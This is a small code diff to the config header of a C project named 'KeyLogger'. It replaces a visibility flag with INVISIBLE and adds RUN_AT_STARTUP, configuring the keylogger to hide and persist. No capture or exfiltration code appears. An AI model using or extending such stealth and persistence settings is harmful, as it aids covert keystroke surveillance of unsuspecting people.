@@ -5,6 +5,7 @@
 #define PROJECT_NAME "KeyLogger"
 #define FILEEXT ".log"
 #define DEBUG
-#define VISIBLE 1
+#define INVISIBLE 1
+#define RUN_AT_STARTUP 1
 
 #endif /* _CONFIG_H */
